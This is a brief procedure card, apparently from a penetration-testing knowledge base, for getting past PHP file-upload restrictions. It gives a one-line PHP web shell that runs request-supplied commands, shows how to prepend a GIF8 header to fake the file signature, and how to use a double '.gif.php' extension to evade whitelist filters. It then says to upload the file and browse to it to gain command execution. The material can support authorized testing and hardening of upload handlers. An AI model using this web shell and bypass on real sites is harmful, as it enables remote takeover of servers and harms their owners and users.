---
id: 7c35d2cd-358c-4819-b729-70d250fed7ed
name: Bypass Insecure PHP Upload Form File Restrictions
type: procedure
verified: true
submitted: true
created_at: '2019-10-09T21:26:59.469888+00:00'
updated_at: '2023-05-26T18:53:28.520787+00:00'
tags:
- '[[php]]'
- '[[Web Applications]]'
---

# Bypass Insecure PHP Upload Form File Restrictions

**Status**: ✓ Verified

## Summary

Many web applications include upload forms with the option to restrict the files which can be uploaded. Using PHP's built-in functions, uploads can be restricted based on file type, file signature, and extension. In cases where one or more of these restrictions is not properly implemented, it may b

## Description

# Description

Many web applications include upload forms with the option to restrict the files which can be uploaded. Using PHP's built-in functions, uploads can be restricted based on file type, file signature, and extension. In cases where one or more of these restrictions is not properly implemented, it may be possible to upload files which skirt the restrictions, but are still executable.

# Instructions

1. Select a payload. Suggested:

**Code**: [[<?php system($_REQUEST['cmd']); ?>]]

2. Prepend `GIF8` and a newline to the payload, changing the file signature.

**Code**: [[GIF8
<?php system($_REQUEST['cmd']); ?>]]

3. Change the filename to  image.gif.php to attempt to use double extension to pass whitelist filters.

4. Upload the file using the web form.

5. If successful, determine the upload location and browse to its location

## Tags

- [[php]]
- [[Web Applications]]
